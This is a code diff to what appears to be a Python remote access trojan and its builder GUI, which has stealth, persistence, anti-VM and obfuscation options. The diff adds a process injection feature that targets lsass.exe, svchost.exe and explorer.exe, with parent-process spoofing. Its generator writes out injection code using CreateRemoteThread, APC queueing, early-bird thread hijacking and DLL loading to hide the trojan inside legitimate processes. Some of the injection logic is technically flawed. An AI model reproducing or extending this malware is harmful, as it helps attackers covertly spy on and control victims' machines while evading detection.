@@ -10994,33 +10994,6 @@ class AdvancedMonitoring:
                     if len(software) >= limit:
                         software = software[:limit]
                         break
-                        
-            else:  # Unix/Linux - use dpkg or rpm
-                if os.path.exists("/usr/bin/dpkg"):  # Debian/Ubuntu
-                    output = subprocess.check_output(["/usr/bin/dpkg", "-l"]).decode('utf-8')
-                    for line in output.split('\n'):
-                        if line.startswith('ii'):
-                            parts = line.split()
-                            if len(parts) >= 3:
-                                software.append({
-                                    'name': parts[1],
-                                    'version': parts[2],
-                                    'architecture': parts[3] if len(parts) > 3 else "Unknown"
-                                })
-                                if len(software) >= limit:
-                                    break
-                                
-                elif os.path.exists("/usr/bin/rpm"):  # Red Hat/Fedora/CentOS
-                    output = subprocess.check_output(["/usr/bin/rpm", "-qa"]).decode('utf-8')
-                    for line in output.split('\n'):
-                        if line.strip():
-                            software.append({
-                                'name': line.strip(),
-                                'version': "N/A",
-                                'architecture': "N/A"
-                            })
-                            if len(software) >= limit:
-                                break
                 
         except Exception as e:
             print(f"[!] Error getting installed software: {e}")
@@ -11099,31 +11072,6 @@ class AdvancedMonitoring:
                                 'source': folder,
                                 'name': item,
                                 'command': item_path
-                            })
-                            
-            else:  # Unix/Linux
-                # Check common startup locations
-                startup_files = [
-                    '/etc/rc.local',
-                    '/etc/init.d',
-                    '/etc/systemd/system',
-                    os.path.expanduser('~/.config/autostart')
-                ]
-                
-                for file_path in startup_files:
-                    if os.path.exists(file_path):
-                        if os.path.isdir(file_path):
-                            for item in os.listdir(file_path):
-                                startup_items.append({
-                                    'source': file_path,
-                                    'name': item,
-                                    'command': os.path.join(file_path, item)
-                                })
-                        else:
-                            startup_items.append({
-                                'source': os.path.dirname(file_path),
-                                'name': os.path.basename(file_path),
-                                'command': file_path
                             })
                 
         except Exception as e:
@@ -12459,11 +12407,11 @@ class NetworkAnalyzer:
 class EnhancedAdaptiveScreenCapture:
     """Handles advanced adaptive quality and performance for screen captures"""
     
-    def __init__(self, client_socket, initial_quality=70):
+    def __init__(self, client_socket, initial_quality=60):
         self.client_socket = client_socket
         self.quality = initial_quality
         self.min_quality = 15
-        self.max_quality = 95
+        self.max_quality = 85
         
         # Adaptive bitrate control with multi-level targets
         self.bitrate_targets = {
@@ -13239,7 +13187,7 @@ class RATClient:
                     
                     return img
                 except Exception as e:
-                    print(f"[!] Fast screen capture failed: {e}")
+                    # print(f"[!] Fast screen capture failed: {e}")
                     return None
             
             # Main capture loop
@@ -13637,6 +13585,8 @@ if __name__ == "__main__":
             "anti_vm": False,
             "mutex_enabled": True,
             "mutex_name": self.mutex_name,
+            "process_injection": False,
+            "injection_method": "createremotethread"
         }
         
         # Setup UI
@@ -13793,20 +13743,6 @@ if __name__ == "__main__":
         icon_browse_btn.pack(side=tk.RIGHT, padx=5)
         self.theme_widgets.append(icon_browse_btn)
         
-        # Compile option
-        compile_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
-        compile_frame.pack(fill=tk.X, padx=10, pady=5)
-        
-        self.compile_var = tk.BooleanVar(value=self.build_options["compile_to_exe"])
-        compile_checkbox = ctk.CTkCheckBox(compile_frame, text="Compile to EXE", 
-                                         variable=self.compile_var,
-                                         onvalue=True, offvalue=False,
-                                         checkbox_width=20,
-                                         checkbox_height=20,
-                                         fg_color=theme["accent_color"])
-        compile_checkbox.pack(side=tk.LEFT, padx=5)
-        self.theme_widgets.append(compile_checkbox)
-        
         # Obfuscation level
         obfuscation_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
         obfuscation_frame.pack(fill=tk.X, padx=10, pady=5)
@@ -13816,10 +13752,10 @@ if __name__ == "__main__":
         
         self.obfuscation_var = tk.IntVar(value=self.build_options["obfuscation"])
         
-        obfuscation_slider = ctk.CTkSlider(obfuscation_frame, from_=0, to=3, 
+        obfuscation_slider = ctk.CTkSlider(obfuscation_frame, from_=0, to=1, 
                                          variable=self.obfuscation_var,
-                                         number_of_steps=3,
-                                         width=150)
+                                         number_of_steps=1,
+                                         width=150, fg_color=theme["accent_color"], button_color=theme["accent_color"])
         obfuscation_slider.pack(side=tk.LEFT, padx=5)
         self.theme_widgets.append(obfuscation_slider)
         
@@ -13832,16 +13768,16 @@ if __name__ == "__main__":
                                           text=str(self.obfuscation_var.get())))
         
         # Stealth options
-        stealth_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
-        stealth_frame.pack(fill=tk.X, padx=5, pady=5)
-        self.theme_widgets.append(stealth_frame)
+        self.stealth_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
+        self.stealth_frame.pack(fill=tk.X, padx=5, pady=5)
+        self.theme_widgets.append(self.stealth_frame)
         
-        stealth_label = ctk.CTkLabel(stealth_frame, text="Stealth Options", 
+        stealth_label = ctk.CTkLabel(self.stealth_frame, text="Stealth Options", 
                                    font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
         stealth_label.pack(anchor="w", padx=10, pady=5)
         
         # Persistence
-        persistence_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        persistence_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         persistence_frame.pack(fill=tk.X, padx=10, pady=5)
         
         self.persistence_var = tk.BooleanVar(value=self.build_options["persistence"])
@@ -13856,7 +13792,7 @@ if __name__ == "__main__":
         self.theme_widgets.append(persistence_checkbox)
         
         # Persistence method
-        method_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        method_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         method_frame.pack(fill=tk.X, padx=10, pady=5)
         
         method_label = ctk.CTkLabel(method_frame, text="Persistence Method:", width=150)
@@ -13872,7 +13808,7 @@ if __name__ == "__main__":
         self.theme_widgets.append(method_dropdown)
         
         # Startup name
-        startup_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        startup_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         startup_frame.pack(fill=tk.X, padx=10, pady=5)
         
         startup_label = ctk.CTkLabel(startup_frame, text="Startup Name:", width=150)
@@ -13884,7 +13820,7 @@ if __name__ == "__main__":
         self.theme_widgets.append(self.startup_name_entry)
         
         # Hide console
-        console_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        console_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         console_frame.pack(fill=tk.X, padx=10, pady=5)
         
         self.hide_console_var = tk.BooleanVar(value=self.build_options["hide_console"])
@@ -13898,7 +13834,7 @@ if __name__ == "__main__":
         self.theme_widgets.append(hide_console_checkbox)
         
         # Anti-VM
-        antivm_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        antivm_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         antivm_frame.pack(fill=tk.X, padx=10, pady=5)
         
         self.antivm_var = tk.BooleanVar(value=self.build_options["anti_vm"])
@@ -13912,7 +13848,7 @@ if __name__ == "__main__":
         self.theme_widgets.append(antivm_checkbox)
         
         # Mutex (prevent multiple instances)
-        mutex_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        mutex_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         mutex_frame.pack(fill=tk.X, padx=10, pady=5)
         
         self.mutex_var = tk.BooleanVar(value=self.build_options["mutex_enabled"])
@@ -13927,7 +13863,7 @@ if __name__ == "__main__":
         self.theme_widgets.append(mutex_checkbox)
         
         # Mutex name
-        mutex_name_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
+        mutex_name_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
         mutex_name_frame.pack(fill=tk.X, padx=10, pady=5)
         
         mutex_name_label = ctk.CTkLabel(mutex_name_frame, text="Mutex Name:", width=150)
@@ -13937,68 +13873,11 @@ if __name__ == "__main__":
         self.mutex_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
         self.mutex_name_entry.insert(0, self.build_options["mutex_name"])
         self.theme_widgets.append(self.mutex_name_entry)
-        
-        # # Feature Selection
-        # features_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
-        # features_frame.pack(fill=tk.X, padx=5, pady=5)
-        # self.theme_widgets.append(features_frame)
-        
-        # features_label = ctk.CTkLabel(features_frame, text="Features to Include", 
-        #                             font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
-        # features_label.pack(anchor="w", padx=10, pady=5)
-        
-        # # Create checkboxes for each feature
-        # self.feature_vars = {}
-        # features_container = ctk.CTkFrame(features_frame, fg_color="transparent")
-        # features_container.pack(fill=tk.X, padx=10, pady=5)
-        
-        # # Left column
-        # left_features = ctk.CTkFrame(features_container, fg_color="transparent")
-        # left_features.pack(side=tk.LEFT, fill=tk.Y, expand=True)
-        
-        # # Right column
-        # right_features = ctk.CTkFrame(features_container, fg_color="transparent")
-        # right_features.pack(side=tk.RIGHT, fill=tk.Y, expand=True)
-        
-        # # Add features to columns
-        # feature_columns = [
-        #     # Left column
-        #     (left_features, [
-        #         ("screenshot", "Screen Capture"),
-        #         ("keylogger", "Keylogger"),
-        #         ("audio", "Audio Capture"),
-        #         ("process_manager", "Process Manager")
-        #     ]),
-        #     # Right column
-        #     (right_features, [
-        #         ("file_transfer", "File Transfer"),
-        #         ("advanced_monitoring", "Advanced Monitoring"),
-        #         ("remote_desktop", "Remote Desktop Control")
-        #     ])
-        # ]
-        
-        # for column, features in feature_columns:
-        #     for feature_id, feature_name in features:
-        #         self.feature_vars[feature_id] = tk.BooleanVar(value=self.build_options["features"].get(feature_id, True))
-        #         feature_checkbox = ctk.CTkCheckBox(column, text=feature_name, 
-        #                                          variable=self.feature_vars[feature_id],
-        #                                          onvalue=True, offvalue=False,
-        #                                          checkbox_width=20,
-        #                                          checkbox_height=20,
-        #                                          fg_color=theme["accent_color"])
-        #         feature_checkbox.pack(anchor="w", padx=5, pady=3)
-        #         self.theme_widgets.append(feature_checkbox)
+        self.setup_injection_ui()
         
         # Build buttons
         button_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
         button_frame.pack(fill=tk.X, padx=5, pady=10)
-        
-        # build_py_btn = ctk.CTkButton(button_frame, text="Build Python Script", 
-        #                            command=lambda: self.build_client(compile_exe=False),
-        #                            fg_color=theme["button_color"],
-        #                            hover_color=theme["hover_color"])
-        # build_py_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
-        # self.theme_widgets.append(build_py_btn)
         
         build_exe_btn = ctk.CTkButton(button_frame, text="Build EXE", 
                                     command=lambda: self.build_client(compile_exe=True),
@@ -14011,19 +13890,7 @@ if __name__ == "__main__":
         # Create notebook for tabs
         right_notebook = ttk.Notebook(right_panel)
         right_notebook.pack(fill=tk.BOTH, expand=True)
-        
-        # # Preview tab
-        # preview_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
-        # right_notebook.add(preview_frame, text="Code Preview")
-        
-        # # Code preview
-        # self.code_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD,
-        #                                             background=theme["bg_color"],
-        #                                             foreground=theme["fg_color"],
-        #                                             font=("Consolas", 10))
-        # self.code_preview.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        # self.theme_text_widgets.append(self.code_preview)
-        
+
         # Build log tab
         log_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
         right_notebook.add(log_frame, text="Build Log")
@@ -14071,6 +13938,615 @@ if __name__ == "__main__":
         # Register with theme manager
         self.register_with_theme_manager()
     
+    
+    
+    def setup_injection_ui(self):
+        """Set up the process injection UI elements"""
+        theme = self.get_theme_colors()
+        
+        # Create injection frame in stealth options
+        injection_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
+        injection_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Enable process injection checkbox
+        self.injection_var = tk.BooleanVar(value=self.build_options.get("process_injection", False))
+        injection_checkbox = ctk.CTkCheckBox(injection_frame, text="Enable Process Injection", 
+                                        variable=self.injection_var,
+                                        onvalue=True, offvalue=False,
+                                        command=self.toggle_injection_options,
+                                        checkbox_width=20,
+                                        checkbox_height=20,
+                                        fg_color=theme["accent_color"])
+        injection_checkbox.pack(side=tk.LEFT, padx=5)
+        self.theme_widgets.append(injection_checkbox)
+        
+        # Injection method dropdown
+        method_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
+        method_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        method_label = ctk.CTkLabel(method_frame, text="Injection Method:", width=150)
+        method_label.pack(side=tk.LEFT, padx=5)
+        
+        self.injection_method_var = tk.StringVar(value=self.build_options.get("injection_method", "createremotethread"))
+        self.method_dropdown = ctk.CTkOptionMenu(method_frame, 
+                                        values=["createremotethread", "reflectivedll", "apc", "earlybird"],
+                                        variable=self.injection_method_var,
+                                        fg_color=theme["button_color"],
+                                        button_color=theme["button_color"],
+                                        button_hover_color=theme["hover_color"], state='disabled')
+        self.method_dropdown.pack(side=tk.LEFT, padx=5)
+        self.theme_widgets.append(self.method_dropdown)
+        
+        # Target process options
+        process_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
+        process_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        process_label = ctk.CTkLabel(process_frame, text="Target Process:", width=150)
+        process_label.pack(side=tk.LEFT, padx=5)
+        
+        # Common processes that are typically long-running and have high privileges
+        default_processes = ["explorer.exe", "svchost.exe", "lsass.exe", "winlogon.exe", "rundll32.exe", "conhost.exe"]
+        self.process_var = tk.StringVar(value=self.build_options.get("target_process", "explorer.exe"))
+        
+        self.process_dropdown = ctk.CTkOptionMenu(process_frame, 
+                                        values=default_processes,
+                                        variable=self.process_var,
+                                        fg_color=theme["button_color"],
+                                        button_color=theme["button_color"],
+                                        button_hover_color=theme["hover_color"], state='disabled')
+        self.process_dropdown.pack(side=tk.LEFT, padx=5)
+        self.theme_widgets.append(self.process_dropdown)
+        
+        # Custom process entry
+        custom_process_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
+        custom_process_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        custom_process_label = ctk.CTkLabel(custom_process_frame, text="Custom Process:", width=150)
+        custom_process_label.pack(side=tk.LEFT, padx=5)
+        
+        self.custom_process_entry = ctk.CTkEntry(custom_process_frame, width=200, state='disabled')
+        self.custom_process_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        self.custom_process_entry.insert(0, self.build_options.get("custom_process", ""))
+        self.theme_widgets.append(self.custom_process_entry)
+        
+        # Process selection method
+        selection_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
+        selection_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        self.process_selection_var = tk.StringVar(value=self.build_options.get("process_selection", "fixed"))
+        
+        self.fixed_radio = ctk.CTkRadioButton(selection_frame, text="Fixed Process", 
+                                    variable=self.process_selection_var,
+                                    value="fixed",
+                                    fg_color=theme["accent_color"], state='disabled')
+        self.fixed_radio.pack(side=tk.LEFT, padx=5)
+        self.theme_widgets.append(self.fixed_radio)
+        
+        self.auto_radio = ctk.CTkRadioButton(selection_frame, text="Auto-select from running processes", 
+                                    variable=self.process_selection_var,
+                                    value="auto",
+                                    fg_color=theme["accent_color"], state='disabled')
+        self.auto_radio.pack(side=tk.LEFT, padx=5)
+        self.theme_widgets.append(self.auto_radio)
+        
+        # Parent-child relation
+        parent_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
+        parent_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        self.spoofed_parent_var = tk.BooleanVar(value=self.build_options.get("spoofed_parent", False))
+        self.parent_checkbox = ctk.CTkCheckBox(parent_frame, text="Use spoofed parent process", 
+                                    variable=self.spoofed_parent_var,
+                                    onvalue=True, offvalue=False,
+                                    checkbox_width=20,
+                                    checkbox_height=20,
+                                    fg_color=theme["accent_color"], state='disabled')
+        self.parent_checkbox.pack(side=tk.LEFT, padx=5)
+        self.theme_widgets.append(self.parent_checkbox)
+        
+    def toggle_injection_options(self):
+        """Enable/disable injection options based on checkbox state"""
+        is_enabled = self.injection_var.get()
+        
+        if is_enabled:
+            self.injection_method_var.set(self.build_options["injection_method"])
+            self.method_dropdown.configure(state='normal')
+            self.process_dropdown.configure(state='normal')
+            self.custom_process_entry.configure(state='normal')
+            self.auto_radio.configure(state='normal')
+            self.fixed_radio.configure(state='normal')
+            self.parent_checkbox.configure(state='normal')
+        else:
+            self.method_dropdown.configure(state='disabled')
+            self.process_dropdown.configure(state='disabled')
+            self.custom_process_entry.configure(state='disabled')
+            self.auto_radio.configure(state='disabled')
+            self.fixed_radio.configure(state='disabled')
+            self.parent_checkbox.configure(state='disabled')
+            
+    # Method to update build options with injection settings
+    def update_injection_options(self):
+        """Update build options with current injection settings"""
+        self.build_options["process_injection"] = self.injection_var.get()
+        self.build_options["injection_method"] = self.injection_method_var.get()
+        
+        if self.custom_process_entry.get().strip():
+            self.build_options["target_process"] = self.custom_process_entry.get().strip()
+        else:
+            self.build_options["target_process"] = self.process_var.get()
+            
+        self.build_options["process_selection"] = self.process_selection_var.get()
+        self.build_options["spoofed_parent"] = self.spoofed_parent_var.get()
+        self.build_options["custom_process"] = self.custom_process_entry.get()
+        
+        
+    def generate_injection_code(self):
+        """Generate the appropriate process injection code based on selected method"""
+        method = self.build_options.get("injection_method", "createremotethread")
+        target_process = self.build_options.get("target_process", "explorer.exe")
+        process_selection = self.build_options.get("process_selection", "fixed")
+        spoofed_parent = self.build_options.get("spoofed_parent", False)
+        
+        # Base imports and helper functions
+        injection_code = """
+# Process injection functionality
+import os
+import sys
+import time
+import ctypes
+import platform
+from ctypes import wintypes
+
+# Constants for Windows API
+PROCESS_ALL_ACCESS = 0x1F0FFF
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_EXECUTE_READWRITE = 0x40
+VIRTUAL_MEM = (MEM_COMMIT | MEM_RESERVE)
+PROCESS_CREATE_THREAD = 0x0002
+PROCESS_VM_OPERATION = 0x0008
+PROCESS_VM_WRITE = 0x0020
+PROCESS_QUERY_INFORMATION = 0x0400
+
+# Function to find process ID by name
+def find_process_id(process_name):
+    try:
+        import psutil
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if proc.info['name'].lower() == process_name.lower():
+                    return proc.info['pid']
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        return None
+    except ImportError:
+        # Fallback if psutil isn't available
+        import subprocess
+        import re
+        
+        if platform.system() == 'Windows':
+            process = subprocess.Popen(['tasklist'], stdout=subprocess.PIPE)
+            output = process.communicate()[0].decode('cp437')
+            for line in output.splitlines():
+                if process_name.lower() in line.lower():
+                    pid = re.findall(r'\\d+', line)
+                    if pid:
+                        return int(pid[0])
+        return None
+
+# Get current process as shellcode
+def get_self_as_shellcode():
+    # Read current executable into memory
+    try:
+        with open(sys.executable, 'rb') as f:
+            shellcode = f.read()
+        return shellcode
+    except:
+        # If we're running as a Python script
+        try:
+            with open(sys.argv[0], 'rb') as f:
+                code = f.read()
+            
+            # Simple obfuscation of the Python script
+            import zlib
+            compressed = zlib.compress(code)
+            
+            # Create a bootstrap shellcode that executes the Python code
+            bootstrap = f'''
+import sys
+import zlib
+import base64
+code = zlib.decompress(base64.b64decode({repr(base64.b64encode(compressed).decode())}))
+exec(code)
+'''.encode()
+            return bootstrap
+        except:
+            return None
+    """
+
+        # Add method-specific code
+        if method == "createremotethread":
+            injection_code += """
+# CreateRemoteThread injection
+def inject_with_createremotethread(pid, shellcode):
+    try:
+        # Get handle to the target process
+        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h_process:
+            print(f"[!] Could not open process (PID: {pid})")
+            return False
+        
+        # Allocate memory in the target process
+        arg_address = ctypes.windll.kernel32.VirtualAllocEx(
+            h_process, 
+            0, 
+            len(shellcode), 
+            VIRTUAL_MEM, 
+            PAGE_EXECUTE_READWRITE
+        )
+        
+        # Write shellcode to the allocated memory
+        written = ctypes.c_size_t(0)
+        ctypes.windll.kernel32.WriteProcessMemory(
+            h_process,
+            arg_address,
+            shellcode,
+            len(shellcode),
+            ctypes.byref(written)
+        )
+        
+        # Create a remote thread that executes the shellcode
+        thread_id = ctypes.c_ulong(0)
+        if not ctypes.windll.kernel32.CreateRemoteThread(
+            h_process,
+            None,
+            0,
+            arg_address,
+            None,
+            0,
+            ctypes.byref(thread_id)
+        ):
+            print("[!] Failed to create remote thread")
+            return False
+            
+        print(f"[+] Remote thread created with ID: {thread_id.value}")
+        return True
+        
+    except Exception as e:
+        print(f"[!] Error during injection: {e}")
+        return False
+    """
+        elif method == "apc":
+            injection_code += """
+# APC (Asynchronous Procedure Call) Queue Injection
+def inject_with_apc(pid, shellcode):
+    try:
+        # Constants for APC
+        QUEUE_USER_APC = ctypes.windll.kernel32.QueueUserAPC
+        
+        # Get handle to target process
+        h_process = ctypes.windll.kernel32.OpenProcess(
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+            False,
+            pid
+        )
+        
+        if not h_process:
+            print(f"[!] Could not open process (PID: {pid})")
+            return False
+            
+        # Allocate memory in target process
+        arg_address = ctypes.windll.kernel32.VirtualAllocEx(
+            h_process, 
+            0, 
+            len(shellcode), 
+            VIRTUAL_MEM, 
+            PAGE_EXECUTE_READWRITE
+        )
+        
+        # Write shellcode to allocated memory
+        written = ctypes.c_size_t(0)
+        ctypes.windll.kernel32.WriteProcessMemory(
+            h_process,
+            arg_address,
+            shellcode,
+            len(shellcode),
+            ctypes.byref(written)
+        )
+        
+        # Enumerate threads in the target process
+        import ctypes.wintypes
+        import win32process
+        import win32con
+        import win32api
+        
+        snapshot = win32api.CreateToolhelp32Snapshot(win32con.TH32CS_SNAPTHREAD, 0)
+        thread_entry = win32process.THREADENTRY32()
+        thread_entry.dwSize = ctypes.sizeof(thread_entry)
+        
+        success = False
+        
+        # Loop through threads and inject APC into them
+        ret = win32process.Thread32First(snapshot, ctypes.byref(thread_entry))
+        while ret:
+            if thread_entry.th32OwnerProcessID == pid:
+                # Get thread handle
+                h_thread = ctypes.windll.kernel32.OpenThread(
+                    win32con.THREAD_SET_CONTEXT,
+                    False,
+                    thread_entry.th32ThreadID
+                )
+                
+                if h_thread:
+                    # Queue APC to thread
+                    if QUEUE_USER_APC(arg_address, h_thread, 0):
+                        print(f"[+] APC queued to thread {thread_entry.th32ThreadID}")
+                        success = True
+                    
+                    # Close thread handle
+                    ctypes.windll.kernel32.CloseHandle(h_thread)
+            
+            # Get next thread
+            ret = win32process.Thread32Next(snapshot, ctypes.byref(thread_entry))
+        
+        # Close handles
+        win32api.CloseHandle(snapshot)
+        ctypes.windll.kernel32.CloseHandle(h_process)
+        
+        return success
+            
+    except Exception as e:
+        print(f"[!] Error during APC injection: {e}")
+        return False
+    """
+        elif method == "earlybird":
+            injection_code += """
+# Early Bird Injection (Process Creation + Thread Hijacking)
+def inject_with_earlybird(target_process, shellcode):
+    try:
+        import win32process
+        import win32con
+        import win32api
+        import win32security
+        
+        # Create process in suspended state
+        startup_info = win32process.STARTUPINFO()
+        security_attrs = win32security.SECURITY_ATTRIBUTES()
+        security_attrs_thread = win32security.SECURITY_ATTRIBUTES()
+        
+        # Create the process suspended
+        proc_info = win32process.CreateProcess(
+            None,                           # Application name
+            target_process,                 # Command line
+            security_attrs,                 # Process attributes
+            security_attrs_thread,          # Thread attributes
+            False,                          # Inherit handles
+            win32con.CREATE_SUSPENDED,      # Creation flags
+            None,                           # Environment
+            None,                           # Current directory
+            startup_info                    # Startup info
+        )
+        
+        # Get handle to the process
+        h_process = proc_info[0]
+        h_thread = proc_info[1]
+        
+        # Allocate memory in the suspended process
+        arg_address = ctypes.windll.kernel32.VirtualAllocEx(
+            h_process, 
+            0, 
+            len(shellcode), 
+            VIRTUAL_MEM, 
+            PAGE_EXECUTE_READWRITE
+        )
+        
+        # Write shellcode to allocated memory
+        written = ctypes.c_size_t(0)
+        ctypes.windll.kernel32.WriteProcessMemory(
+            h_process,
+            arg_address,
+            shellcode,
+            len(shellcode),
+            ctypes.byref(written)
+        )
+        
+        # Get thread context
+        context = win32process.GetThreadContext(h_thread, win32con.CONTEXT_FULL)
+        
+        # Set the instruction pointer to our shellcode
+        context.Eip = arg_address
+        
+        # Set the new context
+        win32process.SetThreadContext(h_thread, context)
+        
+        # Resume the thread
+        win32process.ResumeThread(h_thread)
+        
+        return True
+        
+    except Exception as e:
+        print(f"[!] Error during early bird injection: {e}")
+        return False
+    """
+        elif method == "reflectivedll":
+            injection_code += """
+# Reflective DLL Injection
+def inject_with_reflectivedll(pid, shellcode):
+    try:
+        # For reflective DLL injection, we need to create a DLL on-the-fly
+        import tempfile
+        import shutil
+        
+        # Convert our shellcode to a DLL format with reflective loader
+        dll_template = b'''
+        // DLL template with reflective loading capability
+        #include <windows.h>
+        
+        // Our shellcode
+        unsigned char payload[] = {{{shellcode_bytes}}};
+        
+        BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+            switch (ul_reason_for_call) {{
+                case DLL_PROCESS_ATTACH:
+                    // Create a new thread to execute our shellcode
+                    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
+                    break;
+            }}
+            return TRUE;
+        }}
+        '''
+        
+        # Format shellcode as C byte array
+        shellcode_bytes = ','.join([f'0x{b:02x}' for b in shellcode])
+        dll_code = dll_template.replace(b'{{{shellcode_bytes}}}', shellcode_bytes.encode())
+        
+        # Write to temp file
+        temp_dir = tempfile.mkdtemp()
+        dll_source_path = os.path.join(temp_dir, "reflective.c")
+        dll_output_path = os.path.join(temp_dir, "reflective.dll")
+        
+        with open(dll_source_path, 'wb') as f:
+            f.write(dll_code)
+        
+        # Compile DLL using system compiler (assumes MinGW or similar is installed)
+        import subprocess
+        compile_result = subprocess.run([
+            "gcc", 
+            "-shared", 
+            "-o", dll_output_path,
+            dll_source_path
+        ], capture_output=True)
+        
+        if compile_result.returncode != 0:
+            print(f"[!] Failed to compile DLL: {compile_result.stderr.decode()}")
+            return False
+        
+        # Load the DLL
+        with open(dll_output_path, 'rb') as f:
+            dll_data = f.read()
+        
+        # Clean up temp files
+        shutil.rmtree(temp_dir)
+        
+        # Now inject the DLL into the target process
+        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h_process:
+            print(f"[!] Could not open process (PID: {pid})")
+            return False
+        
+        # Allocate memory for DLL path
+        path_size = len(dll_output_path) + 1
+        path_address = ctypes.windll.kernel32.VirtualAllocEx(
+            h_process, 
+            0, 
+            path_size, 
+            VIRTUAL_MEM, 
+            PAGE_EXECUTE_READWRITE
+        )
+        
+        # Write DLL path to allocated memory
+        written = ctypes.c_size_t(0)
+        ctypes.windll.kernel32.WriteProcessMemory(
+            h_process,
+            path_address,
+            dll_output_path.encode(),
+            path_size,
+            ctypes.byref(written)
+        )
+        
+        # Get address of LoadLibraryA
+        loadlib_addr = ctypes.windll.kernel32.GetProcAddress(
+            ctypes.windll.kernel32.GetModuleHandleA(b"kernel32.dll"),
+            b"LoadLibraryA"
+        )
+        
+        # Create a remote thread that calls LoadLibraryA with the DLL path
+        thread_id = ctypes.c_ulong(0)
+        if not ctypes.windll.kernel32.CreateRemoteThread(
+            h_process,
+            None,
+            0,
+            loadlib_addr,
+            path_address,
+            0,
+            ctypes.byref(thread_id)
+        ):
+            print("[!] Failed to create remote thread")
+            return False
+            
+        print(f"[+] Remote thread created with ID: {thread_id.value}")
+        return True
+        
+    except Exception as e:
+        print(f"[!] Error during reflective DLL injection: {e}")
+        return False
+    """
+
+        # Main injection function that selects the appropriate method
+        process_selection_code = ""
+        if process_selection == "fixed":
+            process_selection_code = f"""
+        # Use fixed process name
+        target_process = "{target_process}"
+        pid = find_process_id(target_process)
+        if not pid:
+            print(f"[!] Process {{target_process}} not found")
+            return False
+    """
+        else:  # auto selection
+            process_selection_code = """
+        # Auto-select from common processes
+        common_processes = ["explorer.exe", "svchost.exe", "winlogon.exe", "rundll32.exe", "conhost.exe"]
+        for proc in common_processes:
+            pid = find_process_id(proc)
+            if pid:
+                target_process = proc
+                print(f"[+] Selected process {proc} (PID: {pid})")
+                break
+        
+        if not pid:
+            print("[!] No suitable target process found")
+            return False
+    """
+
+        injection_function = f"""
+def inject_into_process():
+    # Check if we're on Windows
+    if platform.system() != 'Windows':
+        print("[!] Process injection is only supported on Windows")
+        return False
+    
+    try:
+{process_selection_code}
+        
+        # Get shellcode (our own process code)
+        shellcode = get_self_as_shellcode()
+        if not shellcode:
+            print("[!] Failed to get shellcode")
+            return False
+            
+        print(f"[+] Injecting into process {{target_process}} (PID: {{pid}})")
+        
+        # Use the selected injection method
+        if "{method}" == "createremotethread":
+            return inject_with_createremotethread(pid, shellcode)
+        elif "{method}" == "apc":
+            return inject_with_apc(pid, shellcode)
+        elif "{method}" == "earlybird":
+            return inject_with_earlybird(target_process, shellcode)
+        elif "{method}" == "reflectivedll":
+            return inject_with_reflectivedll(pid, shellcode)
+        else:
+            print(f"[!] Unknown injection method: {method}")
+            return False
+            
+    except Exception as e:
+        print(f"[!] Error during injection: {{e}}")
+        return False
+    """
+
+        injection_code += injection_function
+        return injection_code
+
     def toggle_persistence_options(self):
         """Enable/disable persistence options based on checkbox state"""
         if self.persistence_var.get():
@@ -14113,54 +14589,6 @@ if __name__ == "__main__":
             self.icon_entry.delete(0, tk.END)
             self.icon_entry.insert(0, icon_file)
     
-    # def load_client_template(self):
-    #     """Load the client template code"""
-    #     try:
-    #         # First check if we have an embedded template in the script
-    #         embedded_template = self.get_embedded_template()
-    #         if embedded_template:
-    #             self.client_code = embedded_template
